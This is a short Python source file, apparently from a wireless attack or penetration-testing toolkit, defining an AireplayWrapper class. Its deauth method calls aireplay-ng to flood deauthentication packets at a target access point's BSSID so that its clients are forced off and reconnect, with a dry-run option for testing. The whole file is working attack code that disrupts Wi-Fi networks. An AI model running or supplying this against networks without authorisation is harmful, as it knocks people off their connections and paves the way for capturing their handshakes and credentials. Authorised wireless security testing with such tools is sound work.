import subprocess
import time
import random
from core.logger import log

class AireplayWrapper:
    def __init__(self, dry_run=False):
        self.dry_run = dry_run

    def deauth(self, interface: str, target_bssid: str, count: int = 5) -> bool:
        """
        Sends deauthentication packets to force client reconnection.
        """
        log.info(f"Deauthenticating target {target_bssid}...")
        
        if self.dry_run:
            time.sleep(1)
            return True

        cmd = [
            "aireplay-ng",
            "--deauth", str(count),
            "-a", target_bssid,
            interface
        ]
        
        try:
            subprocess.run(cmd, capture_output=True, check=True)
            return True
        except subprocess.CalledProcessError:
            log.error(f"Deauth failed against {target_bssid}")
            return False
